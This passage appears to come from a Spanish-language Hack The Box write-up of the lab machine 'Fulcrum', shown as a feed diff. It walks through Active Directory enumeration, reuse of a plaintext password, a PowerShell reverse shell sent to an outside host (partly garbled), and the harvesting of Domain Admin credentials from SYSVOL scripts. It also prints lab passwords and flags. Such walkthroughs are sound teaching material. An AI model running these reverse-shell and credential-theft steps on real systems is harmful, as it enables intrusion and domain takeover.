-distinguishedname     : <span class="nv">CN</span><span class="o">=</span>923a,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
-</span>objectclass           : <span class="o">{</span>top, person, organizationalPerson, user<span class="o">}</span>
-name                  : 923a
-objectsid             : S-1-5-21-1158016984-652700382-3033952538-1104
-samaccountname        : 923a
-admincount            : 1
-codepage              : 0
-samaccounttype        : USER_OBJECT
-accountexpires        : NEVER
-countrycode           : 0
-whenchanged           : 5/8/2022 7:10:32 AM
-instancetype          : 4
-usncreated            : 12610
-objectguid            : 8ea0a902-110d-46ec-98b4-825d392c687c
-sn                    : 923a
-lastlogoff            : 12/31/1600 4:00:00 PM
-objectcategory        : <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
-</span>dscorepropagationdata : <span class="o">{</span>5/8/2022 7:10:32 AM, 1/1/1601 12:00:00 AM<span class="o">}</span>
-givenname             : 923a
-c                     : UK
-memberof              : <span class="nv">CN</span><span class="o">=</span>Domain Admins,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
-</span>lastlogon             : 12/31/1600 4:00:00 PM
-streetaddress         : unknown
-badpwdcount           : 0
-cn                    : 923a
-useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
-whencreated           : 5/8/2022 7:02:38 AM
-primarygroupid        : 513
-pwdlastset            : 5/8/2022 12:02:38 AM
-usnchanged            : 12813
-postalcode            : 12345
-
-company               : fulcrum
-logoncount            : 1
-badpasswordtime       : 12/31/1600 4:00:00 PM
-st                    : UN
-l                     : unknown
-distinguishedname     : <span class="nv">CN</span><span class="o">=</span>BTables,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
-</span>objectclass           : <span class="o">{</span>top, person, organizationalPerson, user<span class="o">}</span>
-lastlogontimestamp    : 5/9/2022 7:48:46 AM
-name                  : BTables
-objectsid             : S-1-5-21-1158016984-652700382-3033952538-1105
-samaccountname        : BTables
-codepage              : 0
-samaccounttype        : USER_OBJECT
-accountexpires        : NEVER
-countrycode           : 0
-whenchanged           : 5/9/2022 2:48:46 PM
-instancetype          : 4
-usncreated            : 12628
-objectguid            : 8e5db1d3-d28c-4aa1-b49d-f5f8216959fe
-sn                    : BTables
-info                  : Password <span class="nb">set </span>to ++FileServerLogon12345++
-objectcategory        : <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
-</span>dscorepropagationdata : 1/1/1601 12:00:00 AM
-givenname             : BTables
-c                     : UK
-lastlogon             : 5/9/2022 7:48:46 AM
-streetaddress         : unknown
-badpwdcount           : 0
-cn                    : BTables
-useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
-whencreated           : 5/8/2022 7:02:49 AM
-primarygroupid        : 513
-pwdlastset            : 5/8/2022 12:02:49 AM
-usnchanged            : 16404
-lastlogoff            : 12/31/1600 4:00:00 PM
-postalcode            : 12345
-</code></pre></div></div>
-
-<ul>
-  <li>Si filtramos directo por la info de los usuarios vemos la contraseña del usuario <code class="language-plaintext highlighter-rouge">BTables</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; Get-DomainUser <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-DomainController</span> dc.fulcrum.local | Select Name,Info
-
-name          Info
-<span class="nt">----</span>          <span class="nt">----</span>
-Administrator
-Guest
-krbtgt
-ldap
-923a
-BTables       Password <span class="nb">set </span>to ++FileServerLogon12345++
-</code></pre></div></div>
-
-<ul>
-  <li>Este usuario es administrador del dominio si lo pwneamos tendremos privilegios máximos a nivel de dominio.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; Get-DomainUser <span class="nt">-Credential</span> <span class="nv">$Cred</span> 923a
-
-
-company               : fulcrum
-logoncount            : 0
-badpasswordtime       : 12/31/1600 4:00:00 PM
-st                    : UN
-l                     : unknown
-distinguishedname     : <span class="nv">CN</span><span class="o">=</span>923a,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
-</span>objectclass           : <span class="o">{</span>top, person, organizationalPerson, user<span class="o">}</span>
-name                  : 923a
-objectsid             : S-1-5-21-1158016984-652700382-3033952538-1104
-samaccountname        : 923a
-admincount            : 1
-codepage              : 0
-samaccounttype        : USER_OBJECT
-accountexpires        : NEVER
-countrycode           : 0
-whenchanged           : 5/8/2022 7:10:32 AM
-instancetype          : 4
-usncreated            : 12610
-objectguid            : 8ea0a902-110d-46ec-98b4-825d392c687c
-sn                    : 923a
-lastlogoff            : 12/31/1600 4:00:00 PM
-objectcategory        : <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
-</span>dscorepropagationdata : <span class="o">{</span>5/8/2022 7:10:32 AM, 1/1/1601 12:00:00 AM<span class="o">}</span>
-givenname             : 923a
-c                     : UK
-memberof              : <span class="nv">CN</span><span class="o">=</span>Domain Admins,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
-</span>lastlogon             : 12/31/1600 4:00:00 PM
-streetaddress         : unknown
-badpwdcount           : 0
-cn                    : 923a
-useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
-whencreated           : 5/8/2022 7:02:38 AM
-primarygroupid        : 513
-pwdlastset            : 5/8/2022 12:02:38 AM
-usnchanged            : 12813
-postalcode            : 12345
-</code></pre></div></div>
-
-<ul>
-  <li>Vemos que solo hay 2 equipos mas.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; Get-DomainComputer <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-DomainController</span> dc.fulcrum.local | Select DNSHostname
-
-dnshostname
-<span class="nt">-----------</span>
-DC.fulcrum.local
-FILE.fulcrum.local
-</code></pre></div></div>
-
-<ul>
-  <li>Vamos a usar <code class="language-plaintext highlighter-rouge">Invoke-Command</code> para ejecutar comandos.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; <span class="nv">$SecPassword</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">'++FileServerLogon12345++'</span> <span class="nt">-AsPlainText</span> <span class="nt">-Force</span>
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; <span class="nv">$Cred</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential<span class="o">(</span><span class="s1">'fulcrum.local\BTables'</span>, <span class="nv">$SecPassword</span><span class="o">)</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Podemos ejecutar comandos.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; Invoke-Command <span class="nt">-ComputerName</span> file.fulcrum.local <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-Command</span> <span class="o">{</span> <span class="nb">whoami</span> <span class="o">}</span>
-fulcrum<span class="se">\b</span>tables
-</code></pre></div></div>
-
-<ul>
-  <li>Podemos ver si tenemos conectividad con el puerto <strong>53</strong> <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/test-connection?view=powershell-7.4">https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/test-connection?view=powershell-7.4</a>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; Invoke-Command <span class="nt">-ComputerName</span> file.fulcrum.local <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-Command</span> <span class="o">{</span> Test-NetConnection <span class="nt">-ComputerName</span> 10.10.14.62 <span class="nt">-Port</span> 53 <span class="o">}</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Y bueno recibimos la conexión.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ nc <span class="nt">-nlvp</span> 53
-listening on <span class="o">[</span>any] 53 ...
-connect to <span class="o">[</span>10.10.14.62] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.62] 49737
-</code></pre></div></div>
-
-<ul>
-  <li>
-    <p>Podemos mandarnos una reverse shell <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1</a>.</p>
-  </li>
-  <li>
-    <p>Nos ponemos en escucha.</p>
-  </li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ rlwrap nc <span class="nt">-nlvp</span> 53
-listening on <span class="o">[</span>any] 53 ...
-</code></pre></div></div>
-
-<ul>
-  <li>Y enviamos la reverse shell.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; Invoke-Command <span class="nt">-ComputerName</span> file.fulcrum.local <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-Command</span> <span class="o">{</span> <span class="nv">$client</span> <span class="o">=</span> New-Object System.Net.Sockets.TCPClient<span class="o">(</span><span class="s1">'10.10.14.62'</span>,53<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span> <span class="o">=</span> <span class="nv">$client</span>.GetStream<span class="o">()</span><span class="p">;</span><span class="o">[</span>byte[]]<span class="err">$</span>
-s.Length<span class="o">))</span>
-ng<span class="o">)</span>.GetString<span class="o">(</span><span class="nv">$bytes</span>,0, <span class="nv">$i</span><span class="o">)</span><span class="p">;</span><span class="nv">$sendback</span> <span class="o">=</span> <span class="o">(</span>iex <span class="nv">$data</span> 2&gt;&amp;1 | Out-String <span class="o">)</span><span class="p">;</span><span class="nv">$sendback2</span>  <span class="o">=</span> <span class="nv">$sendback</span> + <span class="s1">'PS '</span> + <span class="o">(</span><span class="nb">pwd</span><span class="o">)</span>.Path + <span class="s1">'&gt; '</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="o">=</span> <span class="o">([</span>text.encoding]::A
-.Length<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Flush<span class="o">()}</span><span class="p">;</span><span class="nv">$client</span>.Close<span class="o">()</span> <span class="o">}</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Recibimos la shell.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ rlwrap nc <span class="nt">-nlvp</span> 53
-listening on <span class="o">[</span>any] 53 ...
-connect to <span class="o">[</span>10.10.14.62] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.62] 49738
-
-PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
-</span>fulcrum<span class="se">\b</span>tables
-PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt;
-</code></pre></div></div>
-
-<h2 id="user-flag">User flag</h2>
-
-<ul>
-  <li>Ya podemos leer la flag.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
-fce52521c8f872b514f037fada78daf4
-</code></pre></div></div>
-
-<h2 id="privilege-escalation">Privilege Escalation</h2>
-
-<ul>
-  <li>Vamos a enumerar por smb desde la powershell.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt; net use <span class="se">\\</span>dc.fulcrum.local /user:fulcrum.local<span class="se">\B</span>Tables ++FileServerLogon12345++
-The <span class="nb">command </span>completed successfully.
-</code></pre></div></div>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt; net view <span class="se">\\</span>dc.fulcrum.local /all
-Shared resources at <span class="se">\\</span>dc.fulcrum.local
-
-
-
-Share name  Type  Used as  Comment
-
-<span class="nt">-------------------------------------------------------------------------------</span>
-ADMIN<span class="nv">$ </span>     Disk           Remote Admin
-C<span class="nv">$ </span>         Disk           Default share
-IPC<span class="nv">$ </span>       IPC   <span class="o">(</span>UNC<span class="o">)</span>    Remote IPC
-NETLOGON    Disk           Logon server share
-SYSVOL      Disk           Logon server share
-The <span class="nb">command </span>completed successfully.
-</code></pre></div></div>
-
-<ul>
-  <li>Vamos a enumerar <code class="language-plaintext highlighter-rouge">SYSVOL</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt; <span class="nb">dir</span> <span class="se">\\</span>dc.fulcrum.local<span class="se">\S</span>YSVOL
-
-
-    Directory: <span class="se">\\</span>dc.fulcrum.local<span class="se">\S</span>YSVOL
-
-
-Mode                LastWriteTime         Length Name                                                                                                                                                                   
-<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                                                                                                                                                                   
-d----l         5/7/2022  11:52 PM                fulcrum.local  
-</code></pre></div></div>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt; <span class="nb">dir</span> <span class="se">\\</span>dc.fulcrum.local<span class="se">\S</span>YSVOL<span class="se">\f</span>ulcrum.local
-
-
-    Directory: <span class="se">\\</span>dc.fulcrum.local<span class="se">\S</span>YSVOL<span class="se">\f</span>ulcrum.local
-
-
-Mode                LastWriteTime         Length Name                                                                                                                                                                   
-<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                                                                                                                                                                   
-d-----         5/7/2022  11:52 PM                Policies                                                                                                                                                               
-d-----         5/7/2022  11:52 PM                scripts    
-</code></pre></div></div>
-
-<ul>
-  <li>Este script reporta demasiados .ps1</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt; <span class="nb">dir</span> <span class="se">\\</span>dc.fulcrum.local<span class="se">\S</span>YSVOL<span class="se">\f</span>ulcrum.local<span class="se">\S</span>cripts
-</code></pre></div></div>
-
-<ul>
-  <li>
-    <p>Los scripts contienen credenciales de usuarios del dominio si recordamos hay un usuario el cual es parte de <code class="language-plaintext highlighter-rouge">Domain Admins</code> que es <code class="language-plaintext highlighter-rouge">923a</code>.</p>
-  </li>
-  <li>
-    <p>Si filtramos por ese usuario como string en todos los archivos encontramos sus credenciales.</p>
-  </li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt; Select-String <span class="s1">'923a'</span> <span class="se">\\</span>dc.fulcrum.local<span class="se">\S</span>YSVOL<span class="se">\f</span>ulcrum.local<span class="se">\S</span>cripts<span class="se">\*</span>
-
-<span class="se">\\</span>dc.fulcrum.local<span class="se">\S</span>YSVOL<span class="se">\f</span>ulcrum.local<span class="se">\S</span>cripts<span class="se">\3</span>807dacb-db2a-4627-b2a3-123d048590e7.ps1:3:<span class="nv">$Pass</span> <span class="o">=</span> <span class="s1">'@fulcrum_df0923a7ca40_$'</span> | ConvertTo-SecureString <span class="nt">-AsPlainText</span> <span class="nt">-Force</span>
-<span class="se">\\</span>dc.fulcrum.local<span class="se">\S</span>YSVOL<span class="se">\f</span>ulcrum.local<span class="se">\S</span>cripts<span class="se">\a</span>1a41e90-147b-44c9-97d7-c9abb5ec0e2a.ps1:2:<span class="nv">$User</span> <span class="o">=</span> <span class="s1">'923a'</span>
-</code></pre></div></div>
-
-<ul>
-  <li>
-    <p>Podemos ejecutar comandos como ese usuario directamente o usar <code class="language-plaintext highlighter-rouge">evil-winrm</code> pero para eso necesitamos usar chisel.</p>
-  </li>
-  <li>
-    <p>Como el usuario es parte de Domain Admin puedes leer la root flag directamente.</p>
-  </li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt; <span class="nv">$password</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">'@fulcrum_bf392748ef4e_$'</span> <span class="nt">-AsPlainText</span> <span class="nt">-Force</span>
-PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt; <span class="nv">$Cred</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential<span class="o">(</span><span class="s1">'FULCRUM\923a'</span>, <span class="nv">$password</span><span class="o">)</span>
-PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt; Invoke-Command <span class="nt">-ComputerName</span> dc.fulcrum.local <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-ScriptBlock</span> <span class="o">{</span> <span class="nb">whoami</span> <span class="o">}</span>
-fulcrum<span class="se">\9</span>23a
-</code></pre></div></div>
-
-<ul>
-  <li>Vemos la root flag.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt; Invoke-Command <span class="nt">-ComputerName</span> dc.fulcrum.local <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-ScriptBlock</span> <span class="o">{</span> <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt <span class="o">}</span>
-8ddbe372e57c019bb6c4cdb5b35a0cab
-</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/insane" /><summary type="html"><![CDATA[]]></summary></entry></feed>
+</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/easy" /><summary type="html"><![CDATA[]]></summary></entry></feed>
